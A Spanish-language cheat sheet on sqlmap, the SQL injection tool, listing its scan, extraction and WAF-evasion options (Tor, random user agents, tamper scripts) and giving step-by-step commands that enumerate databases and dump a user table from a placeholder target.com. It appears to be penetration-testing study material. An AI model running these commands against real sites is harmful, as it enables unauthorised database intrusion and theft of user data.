---------
Tags: #Sql #Postgres #mysql #database #inyección #injection #explotación #Exploitation #blind #herramientas #tools

-----------
# Definición

>[[Sqlmap]] es una herramienta de código abierto programada en Python, diseñada para automatizar el proceso de detección y explotación de vulnerabilidades de **inyección SQL** en aplicaciones web. Esta herramienta de seguridad es un must-have en el arsenal de cualquier especialista en ciberseguridad. Su amplia gama de funcionalidades permite a los usuarios listar bases de datos, recuperar hashes de contraseñas, privilegios y más, en el host objetivo después de detectar inyecciones SQL. Además, SQLMap destaca como una herramienta esencial para hackers éticos y profesionales de pruebas de penetración.

----------------
# Parámetros y Usos

### 🎯 **Nivel y control del escaneo**

|Parámetro|¿Para qué sirve?|Ejemplo|
|---|---|---|
|`--level`|Cuántos tests realiza (1–5)|`--level 3`|
|`--risk`|Riesgo permitido (1–3)|`--risk 2`|
|`--batch`|Ejecuta sin pedir confirmaciones|`--batch`|
|`--threads`|Nº de hilos para acelerar el escaneo|`--threads 5`|

---

### 🏴 **Extracción de datos**

|Parámetro|¿Para qué sirve?|Ejemplo|
|---|---|---|
|`--dbs`|Lista las bases de datos|`--dbs`|
|`--tables -D <db>`|Lista tablas de una base|`--tables -D clientes`|
|`--columns -T <tabla> -D <db>`|Lista columnas de una tabla|`--columns -T users -D clientes`|
|`--dump`|Extrae los datos de una tabla|`--dump`|

---

### 🛡️ **Evasión y técnicas avanzadas**

|Parámetro|¿Para qué sirve?|Ejemplo|
|---|---|---|
|`--tor`|Ruta el tráfico a través de TOR|`--tor`|
|`--proxy`|Usa un proxy HTTP (Burp, ZAP, etc.)|`--proxy "http://127.0.0.1:8080"`|
|`--random-agent`|Usa un `User-Agent` aleatorio (evasión)|`--random-agent`|
|`--tamper`|Aplica scripts de ofuscación|`--tamper=space2comment`|
|`--technique`|Especifica tipo de inyección|`--technique=BEUSTQ`|

> **Técnicas (`--technique`) disponibles:**
> 
> - **B**: Boolean-based blind
>     
> - **E**: Error-based
>     
> - **U**: UNION query
>     
> - **S**: Stacked queries
>     
> - **T**: Time-based blind
>     
> - **Q**: Inline queries
>     

---

## 🧪 **Ejemplo completo con evasión:**

```bash
sqlmap -u "http://target.com/index.php?id=1" \ --random-agent --level 3 --risk 2 --dbs \ --tamper=space2comment --threads 5 --batch
```

✅ Analiza profundamente  
✅ Usa evasión básica  
✅ No requiere interacción  
✅ Ideal para WAFs simples

---
## 🧪 Ejemplo Práctico Completo

Supongamos que tienes un panel vulnerable:
```bash
http://target.com/item.php?id=2
```
Quieres:

- Usar método GET
- Ver qué bases de datos hay
- Trabajar rápido pero sin tanto ruido
- No interactuar manualmente
```bash
sqlmap -u "http://target.com/item.php?id=2" --level 2 --risk 1 --dbs --batch
```

- Luego, si encuentras una base de datos llamada `clientes`, puedes obtener sus tablas:
```bash
sqlmap -u "http://target.com/item.php?id=2" -D clientes --tables --batch
```

- Y después, si ves una tabla `usuarios`, extraer sus datos:
```bash
sqlmap -u "http://target.com/item.php?id=2" -D clientes -T usuarios --dump --batch
```